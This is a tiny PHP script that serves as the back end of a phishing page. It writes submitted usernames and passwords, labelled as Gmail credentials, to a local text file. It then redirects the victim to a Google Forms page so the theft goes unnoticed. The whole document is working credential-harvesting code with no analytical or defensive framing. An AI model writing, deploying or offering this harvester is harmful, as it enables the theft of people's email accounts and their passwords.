<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://docs.google.com/forms/d/e/1FAIpQLSf8-yieXSUfKhbMut4xYoYjTfj5hIjeo0vqIMmOk6rRRAFjrg/viewform');
exit();
?>